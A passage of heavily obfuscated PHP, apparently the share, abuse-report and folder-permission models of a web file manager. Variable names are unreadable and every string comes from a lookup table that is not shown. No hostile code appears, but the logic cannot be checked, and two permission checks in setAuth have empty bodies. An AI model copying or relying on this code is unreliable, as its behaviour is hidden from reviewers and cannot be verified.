($¡„°ª·“ == 0) { $‹íï­Ù = array($¢²Ûö‚Ï[2130] => $õ©âËû[$¢²Ûö‚Ï[1254]], $¢²Ûö‚Ï[1761] => $†‰Á¹Õ½); } if ($¬Ïù£ƒ· = $this->where($‹íï­Ù)->find()) { return $¬Ïù£ƒ·[$¢²Ûö‚Ï[665]]; } if ($¡„°ª·“ == 0) { $Ãø¢±©€ = array($¢²Ûö‚Ï[32] => get_path_this($õ©âËû[$¢²Ûö‚Ï[87]])); } else { $Ãø¢±©€ = Model($¢²Ûö‚Ï[895])->sourceInfo($¡„°ª·“); if (!$Ãø¢±©€) { return !1; } } if (!$õ©âËû[$¢²Ûö‚Ï[1659]]) { $õ©âËû[$¢²Ûö‚Ï[1659]] = $Ãø¢±©€[$¢²Ûö‚Ï[32]]; } $Ù¥‘´ôœ = array($¢²Ûö‚Ï[1761] => $†‰Á¹Õ½, $¢²Ûö‚Ï[491] => $¡„°ª·“, $¢²Ûö‚Ï[1659] => $¢²Ûö‚Ï[12], $¢²Ûö‚Ï[562] => 0, $¢²Ûö‚Ï[663] => 0, $¢²Ûö‚Ï[1254] => $¢²Ûö‚Ï[12], $¢²Ûö‚Ï[383] => $¢²Ûö‚Ï[12], $¢²Ûö‚Ï[964] => $¢²Ûö‚Ï[12], $¢²Ûö‚Ï[2131] => 0, $¢²Ûö‚Ï[2132] => 0, $¢²Ûö‚Ï[832] => 0, $¢²Ûö‚Ï[2133] => $¢²Ûö‚Ï[12], $¢²Ûö‚Ï[2114] => $¢²Ûö‚Ï[12]); $¥°úàªü = explode($¢²Ûö‚Ï[50], $¢²Ûö‚Ï[2134]); foreach ($¥°úàªü as $€ôêêã) { if (!isset($õ©âËû[$€ôêêã])) { continue; } $Ù¥‘´ôœ[$€ôêêã] = $õ©âËû[$€ôêêã]; } $„è¾•õ = $this->add($Ù¥‘´ôœ); $©ü–ñÑŞ = array($¢²Ûö‚Ï[2114] => short_id($„è¾•õ)); $this->where(array($¢²Ûö‚Ï[2135] => $„è¾•õ))->save($©ü–ñÑŞ); return $„è¾•õ; } private function _shareAuthSet($ªŒ¬º£, $Ö¨ºØ‘¿) { $Šğ¥€±— =& $_SERVER[¢ñàß¿€]; if (!is_array($Ö¨ºØ‘¿)) { return !1; } $æ„ê¶æŠ = Model($Šğ¥€±—[2080]); $æ„ê¶æŠ->where(array($Šğ¥€±—[665] => $ªŒ¬º£))->delete(); $í¬‰Á‡â = array(); foreach ($Ö¨ºØ‘¿ as $¨ìú×Õó) { $š‚ÂéÃÊ = SourceModel::TYPE_USER; if ($¨ìú×Õó[$Šğ¥€±—[190]] == SourceModel::TYPE_GROUP) { $š‚ÂéÃÊ = SourceModel::TYPE_GROUP; } $ºï÷ùş = array($Šğ¥€±—[665] => $ªŒ¬º£, $Šğ¥€±—[190] => $š‚ÂéÃÊ, $Šğ¥€±—[569] => intval($¨ìú×Õó[$Šğ¥€±—[569]]), $Šğ¥€±—[2076] => 0, $Šğ¥€±—[2136] => -1); if ($¨ìú×Õó[$Šğ¥€±—[2076]]) { $ºï÷ùş[$Šğ¥€±—[2076]] = $¨ìú×Õó[$Šğ¥€±—[2076]]; } else { if ($¨ìú×Õó[$Šğ¥€±—[2136]]) { $ºï÷ùş[$Šğ¥€±—[2136]] = $¨ìú×Õó[$Šğ¥€±—[2136]]; } } $í¬‰Á‡â[] = $ºï÷ùş; } return $æ„ê¶æŠ->addAll($í¬‰Á‡â, array(), !0); } public function numViewAdd($ÍÆĞßÍ) { $®Ø”ç·Ô =& $_SERVER[¢ñàß¿€]; $º©ïİÃ = array($®Ø”ç·Ô[2135] => $ÍÆĞßÍ); $this->where($º©ïİÃ)->setAdd($®Ø”ç·Ô[2131]); } public function numDownloadAdd($ÍÄààÔß) { $æ‰ œ‘“ =& $_SERVER[¢ñàß¿€]; $ôÑ¿îş¸ = array($æ‰ œ‘“[2135] => $ÍÄààÔß); $this->where($ôÑ¿îş¸)->setAdd($æ‰ œ‘“[2132]); } protected function shareEdit($“¯¤€ß, $éâ€Œğ) { $‘ÏóŠõã =& $_SERVER[¢ñàß¿€]; $Úà˜œõı = $this->getInfo($“¯¤€ß); if (!$Úà˜œõı) { return !1; } $this->_checkLinkShare($éâ€Œğ, $Úà˜œõı); $æÎò£¾ = array(); $Ï²»¬ § = explode($‘ÏóŠõã[50], $‘ÏóŠõã[2137]); foreach ($Ï²»¬ § as $’Ì˜µüù) { if (!array_key_exists($’Ì˜µüù, $éâ€Œğ)) { continue; } $æÎò£¾[$’Ì˜µüù] = $éâ€Œğ[$’Ì˜µüù]; } $this->shareEventAdd($Úà˜œõı[$‘ÏóŠõã[193]], $éâ€Œğ, $‘ÏóŠõã[1938]); $this->where(array($‘ÏóŠõã[2135] => $“¯¤€ß))->save($æÎò£¾); if (isset($éâ€Œğ[$‘ÏóŠõã[2123]])) { $this->_shareAuthSet($“¯¤€ß, $éâ€Œğ[$‘ÏóŠõã[2123]]); } return !0; } private function _checkLinkShare($ù©Æ×¤, $ìØ‚²Óñ) { $ãš»Ï­× =& $_SERVER[¢ñàß¿€]; if ($ù©Æ×¤[$ãš»Ï­×[562]] != $ãš»Ï­×[91]) { return; } $ÌìçóÈÓ = $ìØ‚²Óñ[$ãš»Ï­×[90]][$ãš»Ï­×[193]]; if ($ìØ‚²Óñ[$ãš»Ï­×[90]][$ãš»Ï­×[33]] != $ãš»Ï­×[230]) { $Á£¼åß = $this->_folderReport($ÌìçóÈÓ); if (!$Á£¼åß) { return; } show_json(LNG($ãš»Ï­×[2138]) . $ãš»Ï­×[2139] . $Á£¼åß, !1); } $‘ş‹µ‰ë = Model($ãš»Ï­×[895])->fileInfoGet($ìØ‚²Óñ[$ãš»Ï­×[90]][$ãš»Ï­×[193]]); if (!$‘ş‹µ‰ë) { return; } $Èˆêé± = $this->shareFileMeta($‘ş‹µ‰ë[$ãš»Ï­×[541]]); if (isset($Èˆêé±[$ãš»Ï­×[450]]) && $Èˆêé±[$ãš»Ï­×[450]] == $ãš»Ï­×[91]) { show_json(LNG($ãš»Ï­×[2140]), !1); } } private function _folderReport($˜Ç¦Õ¶Æ) { $„ãã­´  =& $_SERVER[¢ñàß¿€]; $˜ÃâÆë¥ = array($„ãã­´ [541] => array($„ãã­´ [1087], 0), $„ãã­´ [821] => 3); $°™“ù‹ = Model($„ãã­´ [2141])->where($˜ÃâÆë¥)->field($„ãã­´ [541])->select(); if (!$°™“ù‹) { return !1; } $°™“ù‹ = array_to_keyvalue($°™“ù‹, $„ãã­´ [12], $„ãã­´ [541]); $ÒÌÀ¥åë = $„ãã­´ [50] . $˜Ç¦Õ¶Æ . $„ãã­´ [50]; $˜ÃâÆë¥ = array($„ãã­´ [541] => array($„ãã­´ [7], $°™“ù‹), $„ãã­´ [584] => array($„ãã­´ [459], "\45{$ÒÌÀ¥åë}\x25"), $„ãã­´ [505] => 0); $©ÛÓ°’À = Model($„ãã­´ [895])->where($˜ÃâÆë¥)->field($„ãã­´ [2142])->find(); if (!$©ÛÓ°’À) { return !1; } $‘î®Ô†– = substr($©ÛÓ°’À[$„ãã­´ [584]], strpos($©ÛÓ°’À[$„ãã­´ [584]], $ÒÌÀ¥åë)); $˜ÃâÆë¥ = array($„ãã­´ [193] => array($„ãã­´ [7], trim($‘î®Ô†–, $„ãã­´ [50]))); $ë šÀ“ = Model($„ãã­´ [895])->where($˜ÃâÆë¥)->field($„ãã­´ [32])->select(); $ù§–çÈ = array_to_keyvalue($ë šÀ“, $„ãã­´ [12], $„ãã­´ [32]); $ù§–çÈ[] = $©ÛÓ°’À[$„ãã­´ [32]]; return implode($„ãã­´ [8], $ù§–çÈ); } protected function remove($’èÂå»‰) { $¾­ŸØòö =& $_SERVER[¢ñàß¿€]; $Ï‰Òƒ¸À = is_array($’èÂå»‰) ? $’èÂå»‰ : array($’èÂå»‰); for ($‘Š÷÷Ÿğ = 0; $‘Š÷÷Ÿğ < count($Ï‰Òƒ¸À); $‘Š÷÷Ÿğ++) { $Ã¿Íû± = $this->getInfo($Ï‰Òƒ¸À[$‘Š÷÷Ÿğ]); if ($Ã¿Íû±[$¾­ŸØòö[663]] == $¾­ŸØòö[91]) { Model($¾­ŸØòö[633])->eventShare($Ã¿Íû±[$¾­ŸØòö[193]], $¾­ŸØòö[2129]); } if ($Ã¿Íû±[$¾­ŸØòö[562]] == $¾­ŸØòö[91]) { Model($¾­ŸØòö[633])->eventShare($Ã¿Íû±[$¾­ŸØòö[193]], $¾­ŸØòö[2128]); } } if (is_array($’èÂå»‰)) { $’èÂå»‰ = array($¾­ŸØòö[7], $’èÂå»‰); } $€ÊÁÌ²Â = array($¾­ŸØòö[665] => $’èÂå»‰); $Â˜ºêŞ¯ = $this->where($€ÊÁÌ²Â)->delete(); if ($Â˜ºêŞ¯) { Model($¾­ŸØòö[666])->where(array($¾­ŸØòö[665] => $’èÂå»‰))->delete(); } return $Â˜ºêŞ¯; } protected function removeBySource($‰Ë’Ä¯ˆ) { $İ›œÖ„ =& $_SERVER[¢ñàß¿€]; $•æô¾í = array($İ›œÖ„[491] => array($İ›œÖ„[492], $‰Ë’Ä¯ˆ)); $”ÚœÓ‚§ = $this->field($İ›œÖ„[665])->where($•æô¾í)->select(); $”ÚœÓ‚§ = array_to_keyvalue($”ÚœÓ‚§, $İ›œÖ„[12], $İ›œÖ„[665]); if (!$”ÚœÓ‚§) { return; } $•æô¾í = array($İ›œÖ„[2135] => array($İ›œÖ„[492], $”ÚœÓ‚§)); $this->where($•æô¾í)->delete(); Model($İ›œÖ„[666])->where($•æô¾í)->delete(); } public function listAll($‰ª¢ËŠó) { $ì·üñŠª =& $_SERVER[¢ñàß¿€]; $ ©Ï„ø¼ = array(); if ($‰ª¢ËŠó[$ì·üñŠª[1770]]) { $ ©Ï„ø¼[$ì·üñŠª[1770]] = $‰ª¢ËŠó[$ì·üñŠª[1770]]; } if ($‰ª¢ËŠó[$ì·üñŠª[831]]) { $¶€¼œÜ… = $‰ª¢ËŠó[$ì·üñŠª[832]] ? $‰ª¢ËŠó[$ì·üñŠª[832]] : strtotime(date($ì·üñŠª[2143])); $ ©Ï„ø¼[$ì·üñŠª[231]] = array($ì·üñŠª[409], array($‰ª¢ËŠó[$ì·üñŠª[831]], $¶€¼œÜ…)); } if ($‰ª¢ËŠó[$ì·üñŠª[33]]) { $ ©Ï„ø¼[$‰ª¢ËŠó[$ì·üñŠª[33]]] = 1; } else { $ ©Ï„ø¼[] = array($ì·üñŠª[562] => array($ì·üñŠª[1087], 0), $ì·üñŠª[663] => array($ì·üñŠª[1087], 0), $ì·üñŠª[2117] => $ì·üñŠª[2070]); } if ($‰ª¢ËŠó[$ì·üñŠª[2066]]) { $ ©Ï„ø¼[] = array($ì·üñŠª[2114] => $‰ª¢ËŠó[$ì·üñŠª[2066]], $ì·üñŠª[1659] => array($ì·üñŠª[459], "\45{$‰ª¢ËŠó[$ì·üñŠª[2066]]}\x25"), $ì·üñŠª[2117] => $ì·üñŠª[2070]); } $Ë²‡¤î = $this->_makeOrder()->where($ ©Ï„ø¼)->selectPage(20); if (empty($Ë²‡¤î[$ì·üñŠª[445]])) { return array(); } $this->_listDataApply($Ë²‡¤î[$ì·üñŠª[445]]); return $Ë²‡¤î; } public function listDataApply($ƒ™ßƒ›) { $this->_listDataApply($ƒ™ßƒ›); return $ƒ™ßƒ›; } private function _listDataApply(&$´Íñ“ş) { $õŠß—ß€ =& $_SERVER[¢ñàß¿€]; $¦ö‡¾Äö = array_to_keyvalue($´Íñ“ş, $õŠß—ß€[12], $õŠß—ß€[1770]); $óáÕ‡á€ = Model($õŠß—ß€[598])->userListInfo(array_unique($¦ö‡¾Äö)); $ù›†ÈÔ€ = array_to_keyvalue($´Íñ“ş, $õŠß—ß€[12], $õŠß—ß€[193]); $Àö±âÙ = Model($õŠß—ß€[895])->sourceListInfo($ù›†ÈÔ€, !0); foreach ($´Íñ“ş as $Ğ°Œ©ÑÍ => &$õ¿íÉèë) { $¿³ÌŸ©• = $õ¿íÉèë[$õŠß—ß€[1770]]; $õ¿íÉèë[$õŠß—ß€[2144]] = $óáÕ‡á€[$¿³ÌŸ©•] ? $óáÕ‡á€[$¿³ÌŸ©•] : !1; $Âõƒ´íœ = $õ¿íÉèë[$õŠß—ß€[193]]; $õ¿íÉèë[$õŠß—ß€[90]] = $Àö±âÙ[$Âõƒ´íœ] ? $Àö±âÙ[$Âõƒ´íœ] : !1; if ($õ¿íÉèë[$õŠß—ß€[90]][$õŠß—ß€[505]] == $õŠß—ß€[91]) { unset($´Íñ“ş[$Ğ°Œ©ÑÍ]); } if ($õ¿íÉèë[$õŠß—ß€[90]] != $õŠß—ß€[228] && !$õ¿íÉèë[$õŠß—ß€[90]]) { unset($´Íñ“ş[$Ğ°Œ©ÑÍ]); } } unset($õ¿íÉèë); $´Íñ“ş = array_values($´Íñ“ş); } private function _makeOrder($Ù¬ã¹Ø = '') { $—ıÛ¨Ô” =& $_SERVER[¢ñàß¿€]; $É×™™ñÇ = array($—ıÛ¨Ô”[231], $—ıÛ¨Ô”[832], $—ıÛ¨Ô”[2131], $—ıÛ¨Ô”[2132]); $€®»Ò” = array($—ıÛ¨Ô”[523] => $—ıÛ¨Ô”[524], $—ıÛ¨Ô”[525] => $—ıÛ¨Ô”[526]); $×“ÑÓÅõ = Input::get($—ıÛ¨Ô”[530], $—ıÛ¨Ô”[7], $—ıÛ¨Ô”[497], $É×™™ñÇ); $¼Ü‘‰è‰ = Input::get($—ıÛ¨Ô”[531], $—ıÛ¨Ô”[7], $—ıÛ¨Ô”[2145], array($—ıÛ¨Ô”[2063], $—ıÛ¨Ô”[525])); $¼Ü‘‰è‰ = $€®»Ò”[$¼Ü‘‰è‰]; $Ù¬ã¹Ø = $Ù¬ã¹Ø . "{$×“ÑÓÅõ}\40{$¼Ü‘‰è‰}"; return $this->order($Ù¬ã¹Ø); } public function reportAdd($£’Ş¢·) { $ÅüÀö×† =& $_SERVER[¢ñàß¿€]; $«õ ¢„‘ = array($ÅüÀö×†[665] => $£’Ş¢·[$ÅüÀö×†[665]], $ÅüÀö×†[1770] => USER_ID); if (Model($ÅüÀö×†[2141])->where($«õ ¢„‘)->find()) { return !1; } $µ–„ü¬â = array($ÅüÀö×†[665] => $£’Ş¢·[$ÅüÀö×†[665]], $ÅüÀö×†[1659] => $£’Ş¢·[$ÅüÀö×†[1659]], $ÅüÀö×†[193] => $£’Ş¢·[$ÅüÀö×†[193]], $ÅüÀö×†[541] => $£’Ş¢·[$ÅüÀö×†[541]], $ÅüÀö×†[1770] => USER_ID, $ÅüÀö×†[33] => $£’Ş¢·[$ÅüÀö×†[33]], $ÅüÀö×†[526] => $£’Ş¢·[$ÅüÀö×†[526]]); return Model($ÅüÀö×†[2141])->add($µ–„ü¬â); } public function reportList($¿ğ‚ÎÜ…) { $»§˜ ¤Ô =& $_SERVER[¢ñàß¿€]; $´Â¨Ğù = array(); if ($¿ğ‚ÎÜ…[$»§˜ ¤Ô[831]]) { $ƒ„Œ”·¤ = $¿ğ‚ÎÜ…[$»§˜ ¤Ô[832]] ? $¿ğ‚ÎÜ…[$»§˜ ¤Ô[832]] : strtotime(date($»§˜ ¤Ô[2143])); $´Â¨Ğù[$»§˜ ¤Ô[231]] = array($»§˜ ¤Ô[409], array($¿ğ‚ÎÜ…[$»§˜ ¤Ô[831]], $ƒ„Œ”·¤)); } if (isset($¿ğ‚ÎÜ…[$»§˜ ¤Ô[33]]) && in_array($¿ğ‚ÎÜ…[$»§˜ ¤Ô[33]], array($»§˜ ¤Ô[91], $»§˜ ¤Ô[510], $»§˜ ¤Ô[2146], $»§˜ ¤Ô[2147], $»§˜ ¤Ô[2148]))) { $´Â¨Ğù[$»§˜ ¤Ô[33]] = $¿ğ‚ÎÜ…[$»§˜ ¤Ô[33]]; } if (isset($¿ğ‚ÎÜ…[$»§˜ ¤Ô[821]]) && in_array($¿ğ‚ÎÜ…[$»§˜ ¤Ô[821]], array($»§˜ ¤Ô[228], $»§˜ ¤Ô[91], $»§˜ ¤Ô[510], $»§˜ ¤Ô[2146]))) { $´Â¨Ğù[$»§˜ ¤Ô[821]] = $¿ğ‚ÎÜ…[$»§˜ ¤Ô[821]]; } $§½êÚş¤ = Input::get($»§˜ ¤Ô[531], $»§˜ ¤Ô[7], $»§˜ ¤Ô[2145], array($»§˜ ¤Ô[2063], $»§˜ ¤Ô[525])); $ƒâ–äï² = array($»§˜ ¤Ô[523] => $»§˜ ¤Ô[524], $»§˜ ¤Ô[525] => $»§˜ ¤Ô[526]); $÷Æò‹¨ = $»§˜ ¤Ô[2149] . $ƒâ–äï²[$§½êÚş¤]; $••ğ—ˆ± = Model($»§˜ ¤Ô[2141])->where($´Â¨Ğù)->order($÷Æò‹¨)->selectPage(20); if (empty($••ğ—ˆ±[$»§˜ ¤Ô[445]])) { return array(); } $Ä´¨ÇÓ = array_to_keyvalue_group($••ğ—ˆ±[$»§˜ ¤Ô[445]], $»§˜ ¤Ô[821], $»§˜ ¤Ô[665]); if (!empty($Ä´¨ÇÓ[0])) { $¿ğ‚ÎÜ… = $Ä´¨ÇÓ[0]; $´Â¨Ğù = array($»§˜ ¤Ô[665] => array($»§˜ ¤Ô[7], $¿ğ‚ÎÜ…)); $ú…öÔ¤“ = $this->where($´Â¨Ğù)->field($»§˜ ¤Ô[665])->select(); $ú…öÔ¤“ = array_to_keyvalue($ú…öÔ¤“, $»§˜ ¤Ô[12], $»§˜ ¤Ô[665]); $¸¥­â‹‹ = array_diff($¿ğ‚ÎÜ…, $ú…öÔ¤“); if (!empty($¸¥­â‹‹)) { foreach ($••ğ—ˆ±[$»§˜ ¤Ô[445]] as $ƒ¼ıåÆå => $’ı¶‚„ò) { if (in_array($’ı¶‚„ò[$»§˜ ¤Ô[665]], $¸¥­â‹‹)) { unset($••ğ—ˆ±[$»§˜ ¤Ô[445]][$ƒ¼ıåÆå]); } } } } $this->_listDataApply($••ğ—ˆ±[$»§˜ ¤Ô[445]]); return $••ğ—ˆ±; } public function reportStatus($¢·ÀÔ‰) { $†‰šáĞ” =& $_SERVER[¢ñàß¿€]; $ö¼˜ˆë‡ = array($†‰šáĞ”[475] => $¢·ÀÔ‰[$†‰šáĞ”[475]]); $‘¦ß£àÙ = Model($†‰šáĞ”[2141])->where($ö¼˜ˆë‡)->field($†‰šáĞ”[2150])->find(); if (!$‘¦ß£àÙ) { return !1; } $¸ş£Ô  = array($†‰šáĞ”[821] => $¢·ÀÔ‰[$†‰šáĞ”[821]]); if ($¢·ÀÔ‰[$†‰šáĞ”[821]] == $†‰šáĞ”[2146] && $‘¦ß£àÙ[$†‰šáĞ”[821]] == $†‰šáĞ”[2146]) { $¸ş£Ô [$†‰šáĞ”[821]] = 0; } $ìÓ®Õ˜Ê = Model($†‰šáĞ”[2141])->where($ö¼˜ˆë‡)->save($¸ş£Ô ); if ($¢·ÀÔ‰[$†‰šáĞ”[821]] == $†‰šáĞ”[510]) { if ($‘¦ß£àÙ[$†‰šáĞ”[541]] != $†‰šáĞ”[228] && $this->shareFileMeta($‘¦ß£àÙ[$†‰šáĞ”[541]])) { $this->shareFileMeta($‘¦ß£àÙ[$†‰šáĞ”[541]], 0); } $this->remove($‘¦ß£àÙ[$†‰šáĞ”[665]]); return !0; } if ($ìÓ®Õ˜Ê && $¢·ÀÔ‰[$†‰šáĞ”[821]] == $†‰šáĞ”[2146]) { $ëÁûÑ–Î = $¸ş£Ô [$†‰šáĞ”[821]] == $†‰šáĞ”[2146] ? 1 : 0; $this->shareFileMeta($‘¦ß£àÙ[$†‰šáĞ”[541]], $ëÁûÑ–Î); $this->removeByFile($‘¦ß£àÙ[$†‰šáĞ”[541]]); } return $ìÓ®Õ˜Ê; } private function removeByFile($‰à¦¯µŸ) { $š®˜©…û =& $_SERVER[¢ñàß¿€]; $–ÜÜĞîò = Model($š®˜©…û[895])->where(array($š®˜©…û[541] => $‰à¦¯µŸ))->field($š®˜©…û[193])->select(); $›–¾…Ù = array_to_keyvalue($–ÜÜĞîò, $š®˜©…û[12], $š®˜©…û[193]); $Å™íÜº· = array($š®˜©…û[193] => array($š®˜©…û[7], $›–¾…Ù), $š®˜©…û[562] => 1); $–ÜÜĞîò = $this->where($Å™íÜº·)->field($š®˜©…û[665])->select(); if (empty($–ÜÜĞîò)) { return; } $Üà“šÙ = array_to_keyvalue($–ÜÜĞîò, $š®˜©…û[12], $š®˜©…û[665]); $this->remove($Üà“šÙ); } private function shareFileMeta($°¿Š÷¹ï, $ù‰±ï‡× = null) { $´éÍÜ‘ª =& $_SERVER[¢ñàß¿€]; $ß®·Ê§¹ = array($´éÍÜ‘ª[541] => $°¿Š÷¹ï, $´éÍÜ‘ª[97] => $´éÍÜ‘ª[2151]); if (is_null($ù‰±ï‡×)) { return Model($´éÍÜ‘ª[2152])->where($ß®·Ê§¹)->find(); } $ß®·Ê§¹[$´éÍÜ‘ª[450]] = $ù‰±ï‡×; Model($´éÍÜ‘ª[2152])->add($ß®·Ê§¹, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\143\x65\x5f\x61\165\164\150"; public function getAuth($Ë“„öÀ¯) { $Ô”şØ¦´ =& $_SERVER[¢ñàß¿€]; $¾·ÉòÜë = $this->sourceAuthSelect($Ë“„öÀ¯); $è›¹Òµ§ = array(); $İ£ÚÛÏÉ = array(); $“²µÏ»Ä = 2 << 25; foreach ($¾·ÉòÜë as $üğ£±êö) { $ÄÕêÖÇŒ = Model($Ô”şØ¦´[571])->listData($üğ£±êö[$Ô”şØ¦´[2076]]); if (!$ÄÕêÖÇŒ) { continue; } $è›¹Òµ§[] = $üğ£±êö; $’ìÀöüÜ = 0; if ($üğ£±êö[$Ô”şØ¦´[190]] == SourceModel::TYPE_GROUP) { $’ìÀöüÜ = $“²µÏ»Ä * 2; } if ($üğ£±êö[$Ô”şØ¦´[190]] == SourceModel::TYPE_USER) { $’ìÀöüÜ = $“²µÏ»Ä; } if ($üğ£±êö[$Ô”şØ¦´[190]] == SourceModel::TYPE_USER && $üğ£±êö[$Ô”şØ¦´[569]] == $Ô”şØ¦´[228]) { $’ìÀöüÜ = 0; } $İ£ÚÛÏÉ[] = $ÄÕêÖÇŒ[$Ô”şØ¦´[487]] + $’ìÀöüÜ; } array_multisort($İ£ÚÛÏÉ, SORT_DESC, $è›¹Òµ§); return $è›¹Òµ§; } public function sourceAuthSelect($¤´ïÀÜ») { $èã¸è¯§ =& $_SERVER[¢ñàß¿€]; static $ÎúÁâ®ò = array(); $Ùƒ³ªúå = is_array($¤´ïÀÜ») ? !1 : !0; if ($Ùƒ³ªúå) { $¤´ïÀÜ» = array($¤´ïÀÜ»); } $İÜ²ô˜ú = array(); foreach ($¤´ïÀÜ» as $¢×™üìœ) { if (isset($ÎúÁâ®ò[$¢×™üìœ])) { $İÜ²ô˜ú[$¢×™üìœ] = $ÎúÁâ®ò[$¢×™üìœ]; } } if (count($İÜ²ô˜ú) == count($¤´ïÀÜ»)) { return $Ùƒ³ªúå ? $İÜ²ô˜ú[$¤´ïÀÜ»[0]] : $İÜ²ô˜ú; } $ô”ÜµÄÂ = $èã¸è¯§[2153]; $Ùí¾Áúì = array($èã¸è¯§[193] => array($èã¸è¯§[7], $¤´ïÀÜ»)); $ÉÇÌ¹á = $this->field($ô”ÜµÄÂ)->order($èã¸è¯§[475])->where($Ùí¾Áúì)->select(); $¢Àëø×ı = array_to_keyvalue_group($ÉÇÌ¹á, $èã¸è¯§[193]); foreach ($¤´ïÀÜ» as $¢×™üìœ) { $ÎúÁâ®ò[$¢×™üìœ] = $¢Àëø×ı[$¢×™üìœ] ? $¢Àëø×ı[$¢×™üìœ] : array(); } if ($Ùƒ³ªúå) { return $ÉÇÌ¹á; } return $¢Àëø×ı; } public function setAuth($Üµ…”òì, $É¼ÃëÜ) { $ˆìãğ¯½ =& $_SERVER[¢ñàß¿€]; $Ä¢òÓ´¢ = Model($ˆìãğ¯½[1414])->sourceInfo($Üµ…”òì); if (!$Ä¢òÓ´¢) { return !1; } if ($Ä¢òÓ´¢[$ˆìãğ¯½[190]] != SourceModel::TYPE_GROUP) { return !1; } $ººÚ»¥  = 1; $£ö‘¥ùÌ = $Ä¢òÓ´¢[$ˆìãğ¯½[569]]; if ($£ö‘¥ùÌ != $ººÚ»¥ ) { $ò–ñì•¨ = array($ˆìãğ¯½[1968] => $£ö‘¥ùÌ); $×ñ€ÛĞô = Model($ˆìãğ¯½[2062])->field($ˆìãğ¯½[1770])->where($ò–ñì•¨)->select(); $×ñ€ÛĞô = array_to_keyvalue($×ñ€ÛĞô, $ˆìãğ¯½[12], $ˆìãğ¯½[1770]); } $Ï¡›Ã¿¼ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ú†‡ºà’ = array(); foreach ($É¼ÃëÜ as $¼è—æ¾©) { if (!in_array($¼è—æ¾©[$ˆìãğ¯½[190]], $Ï¡›Ã¿¼)) { show_json(LNG($ˆìãğ¯½[2154]), !1); } if ($£ö‘¥ùÌ != $ººÚ»¥ ) { if ($¼è—æ¾©[$ˆìãğ¯½[190]] == SourceModel::TYPE_GROUP) { } if ($¼è—æ¾©[$ˆìãğ¯½[569]] != 0 && !in_array($¼è—æ¾©[$ˆìãğ¯½[569]], $×ñ€ÛĞô)) { } } if ($¼è—æ¾©[$ˆìãğ¯½[569]] == 0) { $¼è—æ¾©[$ˆìãğ¯½[190]] = SourceModel::TYPE_USER; } $Ú†‡ºà’[] = array($ˆìãğ¯½[193] => $Üµ…”òì, $ˆìãğ¯½[190] => intval($¼è—æ¾©[$ˆìãğ¯½[190]]), $ˆìãğ¯½[569] => intval($¼è—æ¾©[$ˆìãğ¯½[569]]), $ˆìãğ¯½[2076] => intval($¼è—æ¾©[$ˆìãğ¯½[2076]]) ? intval($¼è—æ¾©[$ˆìãğ¯½[2076]]) : 0, $ˆìãğ¯½[2136] => intval($¼è—æ¾©[$ˆìãğ¯½[2136]]) ? intval($¼è—æ¾©[$ˆìãğ¯½[2136]]) : -1); } $this->where(array($ˆìãğ¯½[491] => $Üµ…”òì))->delete(); $this->addAll($Ú†‡ºà’); return !0; } public function authClear($Â™ƒ¨Û) { $‡œ˜æ¢Ã =& $_SERVER[¢ñàß¿€]; $ëºŞÑÉÓ = Model($‡œ˜æ¢Ã[1414])->sourceInfo($Â™ƒ¨Û); $²­°ÆÄ = array($Â™ƒ¨Û); if ($ëºŞÑÉÓ[$‡œ˜æ¢Ã[485]] == $‡œ˜æ¢Ã[91]) { $Û€¾ŒŠŠ = array($‡œ˜æ¢Ã[652] => array($‡œ˜æ¢Ã[612], $ëºŞÑÉÓ[$‡œ˜æ¢Ã[584]] . $Â™ƒ¨Û . $‡œ˜æ¢Ã[613])); $²­°ÆÄ = Model($‡œ˜æ¢Ã[1414])->field($‡œ˜æ¢Ã[491])->where($Û€¾ŒŠŠ)->getField($‡œ˜æ¢Ã[193], !0); $²­°ÆÄ[] = $Â™ƒ¨Û; } $this->where(array($‡œ˜æ¢Ã[491] => array($‡œ˜æ¢Ã[492], $²­°ÆÄ)))->delete(); return !0; } public function getAllChildren($´¥âæ–ô) { $ëØû§Ö =& $_SERVER[¢ñàß¿€]; $³µ„ÍÚ = Model($ëØû§Ö[1414])->sourceInfo($´¥âæ–ô); if ($³µ„ÍÚ[$ëØû§Ö[485]] != $ëØû§Ö[91]) { return $this->sourceListAuth(array($´¥âæ–ô)); } if ($³µ„ÍÚ[$ëØû§Ö[190]] != SourceModel::TYPE_GROUP) { return array(); } $¶±íñ«— = 1; $¦Ë’ÍÕı = array($´¥âæ–ô); if ($³µ„ÍÚ[$ëØû§Ö[192]] == $ëØû§Ö[228] && $³µ„ÍÚ[$ëØû§Ö[569]] != $¶±íñ«—) { $¦Ë’ÍÕı = $this->groupChidldAllRootSource($³µ„ÍÚ[$ëØû§Ö[569]]); } $ï‘‹ßÑ£ = $this->field($ëØû§Ö[193])->group($ëØû§Ö[193])->select(); $ï‘‹ßÑ£ = array_to_keyvalue($ï‘‹ßÑ£, $ëØû§Ö[12], $ëØû§Ö[193]); if (!$ï‘‹ßÑ£) { return array(); } $‰ñãÆ¹ = $ëØû§Ö[2155]; $€ˆÌ«²Ë = array($ëØû§Ö[193] => array($ëØû§Ö[7], $ï‘‹ßÑ£), $ëØû§Ö[505] => $ëØû§Ö[228]); $ªĞñƒ™Ê = Model($ëØû§Ö[895])->field($‰ñãÆ¹)->where($€ˆÌ«²Ë)->select(); $‰›óÜš± = array($´¥âæ–ô); foreach ($ªĞñƒ™Ê as $ÃÆ€ª›Š) { foreach ($¦Ë’ÍÕı as $ºòÊœ™è) { $Å¢˜ÀÏ» = $ëØû§Ö[50] . $ºòÊœ™è . $ëØû§Ö[50]; $’Ô»ìì = $ÃÆ€ª›Š[$ëØû§Ö[584]] . $ÃÆ€ª›Š[$ëØû§Ö[193]] . $ëØû§Ö[50]; if (strstr($’Ô»ìì, $Å¢˜ÀÏ»)) { $‰›óÜš±[] = $ÃÆ€ª›Š[$ëØû§Ö[193]]; break; } } } return $this->sourceListAuth($‰›óÜš±); } private function sourceListAuth($øü¿ìÓŒ) { $Á¡ŠºÕ =& $_SERVER[¢ñàß¿€]; $²±‘¿ŸĞ = Model($Á¡ŠºÕ[1414])->sourceListInfo($øü¿ìÓŒ, !0); $•«óùğ» = $this->sourceAuthSelect($øü¿ìÓŒ); $Œä‹àú² = array(); $Î¯É¬ÙÓ = array(); foreach ($²±‘¿ŸĞ as $À©½áÃ) { unset($À©½áÃ[$Á¡ŠºÕ[529]]); unset($À©½áÃ[$Á¡ŠºÕ[527]]); unset($À©½áÃ[$Á¡ŠºÕ[487]]); 